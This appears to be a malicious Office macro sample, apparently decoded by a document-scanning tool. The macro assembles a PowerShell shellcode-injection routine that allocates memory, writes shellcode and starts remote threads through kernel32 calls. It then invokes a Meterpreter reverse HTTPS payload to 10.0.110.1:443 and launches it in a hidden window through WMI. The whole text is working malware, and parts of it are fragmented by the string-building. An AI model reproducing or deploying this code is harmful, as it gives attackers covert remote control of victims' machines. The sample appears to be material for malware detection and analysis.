    YYVA = YYVA + " 0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80"
    YYVA = YYVA + ",0xfb,0xe0,0x75,0x05,0xbb,0x47,"
                 "
    YYVA = YYVA + "                 0x13,0x72,0x6f,0x6a,0x00,0x59,0x4"
    YYVA = YYVA + "1,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)"
 "
    YYVA = YYVA + "   }"
    if ( $PSBoundParameters['ProcessID'] )
"
    YYVA = YYVA + "    {"
        $OpenProcessAddr = Get-ProcAddress "
    YYVA = YYVA + "kernel32.dll OpenProcess"
        $OpenProcessDele"
    YYVA = YYVA + "gate = Get-DelegateType @([UInt32], [Bool], [UInt3"
    YYVA = YYVA + "2]) ([IntPtr])"
        $OpenProcess = [System.Run"
    YYVA = YYVA + "time.InteropServices.Marshal]::GetDelegateForFunct"
    YYVA = YYVA + "ionPointer($OpenProcessAddr, $OpenProcessDelegate)"
    YYVA = YYVA + ""
        $VirtualAllocExAddr = Get-ProcAddress ke"
    YYVA = YYVA + "rnel32.dll VirtualAllocEx"
        $VirtualAllocEx"
    YYVA = YYVA + "Delegate = Get-DelegateType @([IntPtr], [IntPtr], "
    YYVA = YYVA + "[Uint32], [UInt32], [UInt32]) ([IntPtr])"
        "
    YYVA = YYVA + "$VirtualAllocEx = [System.Runtime.InteropServices."
    YYVA = YYVA + "Marshal]::GetDelegateForFunctionPointer($VirtualAl"
    YYVA = YYVA + "locExAddr, $VirtualAllocExDelegate)"
        $Writ"
    YYVA = YYVA + "eProcessMemoryAddr = Get-ProcAddress kernel32.dll "
    YYVA = YYVA + "WriteProcessMemory"
        $WriteProcessMemoryDel"
    YYVA = YYVA + "egate = Get-DelegateType @([IntPtr], [IntPtr], [By"
    YYVA = YYVA + "te[]], [UInt32], [UInt32].MakeByRefType()) ([Bool]"
    YYVA = YYVA + ")"
        $WriteProcessMemory = [System.Runtime.I"
    YYVA = YYVA + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
    YYVA = YYVA + "nter($WriteProcessMemoryAddr, $WriteProcessMemoryD"
    YYVA = YYVA + "elegate)"
        $CreateRemoteThreadAddr = Get-Pr"
    YYVA = YYVA + "ocAddress kernel32.dll CreateRemoteThread"
       "
    YYVA = YYVA + " $CreateRemoteThreadDelegate = Get-DelegateType @("
    YYVA = YYVA + "[IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], "
    YYVA = YYVA + "[UInt32], [IntPtr]) ([IntPtr])"
        $CreateRem"
    YYVA = YYVA + "oteThread = [System.Runtime.InteropServices.Marsha"
    YYVA = YYVA + "l]::GetDelegateForFunctionPointer($CreateRemoteThr"
    YYVA = YYVA + "eadAddr, $CreateRemoteThreadDelegate)"
        $Cl"
    YYVA = YYVA + "oseHandleAddr = Get-ProcAddress kernel32.dll Close"
    YYVA = YYVA + "Handle"
        $CloseHandleDelegate = Get-Delegat"
    YYVA = YYVA + "eType @([IntPtr]) ([Bool])"
        $CloseHandle ="
    YYVA = YYVA + " [System.Runtime.InteropServices.Marshal]::GetDele"
    YYVA = YYVA + "gateForFunctionPointer($CloseHandleAddr, $CloseHan"
    YYVA = YYVA + "dleDelegate)"
        if ( $Force -or $psCmdlet.Sh"
    YYVA = YYVA + "ouldContinue( 'Do you wish to carry out your evil "
    YYVA = YYVA + "plans?',"
                 "Injecting shellcode in"
    YYVA = YYVA + "jecting into $((Get-Process -Id $ProcessId).Proces"
    YYVA = YYVA + "sName) ($ProcessId)!" ) )
        {
            "
    YYVA = YYVA + "Inject-RemoteShellcode $ProcessId"
        }
    "
    YYVA = YYVA + "}"
    Else
    {
        $VirtualAllocAddr = Ge"
    YYVA = YYVA + "t-ProcAddress kernel32.dll VirtualAlloc"
        $"
    YYVA = YYVA + "VirtualAllocDelegate = Get-DelegateType @([IntPtr]"
    YYVA = YYVA + ", [UInt32], [UInt32], [UInt32]) ([IntPtr])"
      "
    YYVA = YYVA + "  $VirtualAlloc = [System.Runtime.InteropServices."
    YYVA = YYVA + "Marshal]::GetDelegateForFunctionPointer($VirtualAl"
    YYVA = YYVA + "locAddr, $VirtualAllocDelegate)"
        $VirtualF"
    YYVA = YYVA + "reeAddr = Get-ProcAddress kernel32.dll VirtualFree"
    YYVA = YYVA + ""
        $VirtualFreeDelegate = Get-DelegateType "
    YYVA = YYVA + "@([IntPtr], [Uint32], [UInt32]) ([Bool])"
        "
    YYVA = YYVA + "$VirtualFree = [System.Runtime.InteropServices.Mar"
    YYVA = YYVA + "shal]::GetDelegateForFunctionPointer($VirtualFreeA"
    YYVA = YYVA + "ddr, $VirtualFreeDelegate)"
        $CreateThreadA"
    YYVA = YYVA + "ddr = Get-ProcAddress kernel32.dll CreateThread"
 "
    YYVA = YYVA + "       $CreateThreadDelegate = Get-DelegateType @("
    YYVA = YYVA + "[IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], "
    YYVA = YYVA + "[IntPtr]) ([IntPtr])"
        $CreateThread = [Sys"
    YYVA = YYVA + "tem.Runtime.InteropServices.Marshal]::GetDelegateF"
    YYVA = YYVA + "orFunctionPointer($CreateThreadAddr, $CreateThread"
    YYVA = YYVA + "Delegate)"
        $WaitForSingleObjectAddr = Get-"
    YYVA = YYVA + "ProcAddress kernel32.dll WaitForSingleObject"
    "
    YYVA = YYVA + "    $WaitForSingleObjectDelegate = Get-DelegateTyp"
    YYVA = YYVA + "e @([IntPtr], [Int32]) ([Int])"
        $WaitForSi"
    YYVA = YYVA + "ngleObject = [System.Runtime.InteropServices.Marsh"
    YYVA = YYVA + "al]::GetDelegateForFunctionPointer($WaitForSingleO"
    YYVA = YYVA + "bjectAddr, $WaitForSingleObjectDelegate)"
        "
    YYVA = YYVA + "if ( $Force -or $psCmdlet.ShouldContinue( 'Do you "
    YYVA = YYVA + "wish to carry out your evil plans?',"
            "
    YYVA = YYVA + "     "Injecting shellcode into the running PowerSh"
    YYVA = YYVA + "ell process!" ) )
        {
            Inject-L"
    YYVA = YYVA + "ocalShellcode"
        }
    }
}
Invoke-Shell"
    YYVA = YYVA + "code -Payload windows/meterpreter/reverse_https -L"
    YYVA = YYVA + "host 10.0.110.1 -Lport 443 -Force"
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    objProcess.Create YYVA, Null, objConfig, intProcessID
End Function



' InQuest injected base64 decoded content
' .+-1

INQUEST-PP=macro
